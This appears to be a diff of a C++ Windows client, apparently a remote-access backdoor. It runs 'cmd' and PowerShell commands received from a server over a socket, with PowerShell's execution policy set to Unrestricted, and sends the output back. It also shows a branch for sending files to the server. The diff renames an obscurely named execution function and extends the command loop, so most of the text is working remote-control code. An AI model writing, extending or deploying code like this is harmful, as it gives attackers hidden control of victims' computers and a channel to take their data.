@@ -37,15 +37,18 @@ int Connection::boot() {
     return 0;
 }
 
-
+//Get process name by his pid
 string Connection::getProcessName(int pid) {
-    HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+    HANDLE hProcess = ::OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE,
+                                    pid); //Open handle to the process
+    //Checking if the handle opened
     if (!hProcess) {
         cerr << "Cant open handle to the process" << endl;
         return CANT_OPEN_HANDLE;
     }
     TCHAR szProcessName[MAX_PATH]; //Buffer of that holds the process name
-    GetModuleBaseNameA(hProcess, NULL, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
+    GetModuleBaseNameA(hProcess, NULL, szProcessName, sizeof(szProcessName) /
+                                                      sizeof(TCHAR)); //Getting the process name and storing it in szProcessName
     CloseHandle(hProcess);
     cout << szProcessName << endl;
     return szProcessName;
@@ -165,12 +168,12 @@ string Connection::getAllFiles(string path) {
     return files;
 }
 
-string Connection::e1(string &b1) {
+string Connection::runCmdCommand(string &command) {
     char buffer[128];
     std::string result = "";
-    FILE *pipe = _popen(b1.c_str(), "r");
+    FILE *pipe = _popen(command.c_str(), "r");
     if (!pipe) {
-        return "There is an error with the command " + b1;
+        return "There is an error with the command " + command;
     }
     try {
         while (fgets(buffer, sizeof buffer, pipe) != NULL) {
@@ -178,10 +181,16 @@ string Connection::e1(string &b1) {
         }
     } catch (...) {
         _pclose(pipe);
-        return "There is an error with the command " + b1;
+        return "There is an error with the command " + command;
     }
     _pclose(pipe);
     return result;
+}
+
+string Connection::runPowershellCommand(string &command) {
+    string commandToRun = "powershell -ExecutionPolicy Unrestricted -Command " +
+                          command; // -ExecutionPolicy Unrestricted this means that the powershell ExecutionPolicy will be Unrestricted (permits all scripts to run)
+    return runCmdCommand(commandToRun);
 }
 
 
@@ -241,7 +250,7 @@ void Connection::connection() {
             //Deleting the first 4 (cmd ) characters from the command
             command = command.substr(4, command.size() - 1);
             //Execute the command and saving the output in output
-            string output = e1(command);
+            string output = runCmdCommand(command);
 
             //Send the results to the server
             //If the command is not returning an output
@@ -249,12 +258,44 @@ void Connection::connection() {
                 send(sock, " ", 1, 0);
                 continue;
             }
-            send(sock, reinterpret_cast<const char *>(output.c_str()), output.size(), 0);
+            string size = to_string(output.size());
+            if (size.size() < 15) {
+                for (int i = size.size(); i < 15; i++) {
+                    size += "$";
+                }
+            }
+            //Sending the size of ouput
+            send(sock, size.c_str(), 15, 0);
+            send(sock, output.c_str(), output.size(), 0);
+            cout << output << endl;
+            continue;
+        } else if (!command.rfind("powershell")) {
+            //Removing the powershell from command
+            command = command.substr(11, command.size() - 1);
+            string output = runPowershellCommand(command);
+
+            //Send the results to the server
+            //If the command is not returning an output
+            if (output.empty()) {
+                send(sock, " ", 1, 0);
+                continue;
+            }
+
+            string size = to_string(output.size());
+            if (size.size() < 15) {
+                for (int i = size.size(); i < 15; i++) {
+                    size += "$";
+                }
+            }
+            //Sending the size of output
+            send(sock, size.c_str(), 15, 0);
+            //Sending output
+            send(sock, output.c_str(), output.size(), 0);
             cout << output << endl;
             continue;
         }
-        //For quitting
-        if (!command.rfind("quit")) {
+            //For quitting
+        else if (!command.rfind("quit")) {
             cout << "Quitting!" << endl;
             break;
         } else if (!command.rfind("recv file")) { //Sending file to the server
